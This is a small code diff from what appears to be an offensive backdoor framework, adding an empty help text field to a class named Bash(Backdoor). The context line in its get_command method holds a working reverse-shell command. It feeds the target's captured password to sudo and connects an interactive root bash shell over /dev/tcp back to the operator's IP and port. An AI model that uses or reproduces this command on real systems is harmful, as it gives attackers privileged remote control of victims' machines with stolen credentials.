@@ -13,6 +13,7 @@ class Bash(Backdoor):
         
         self.modules = {} 
         self.allow_modules = True
+        self.help_text = "" 
 
     def get_command(self):
         return "echo " + self.core.curtarget.pword + " | sudo -S nohup bash -i >& /dev/tcp/" + self.core.localIP + "/%s 0>&1" % self.get_value("port")
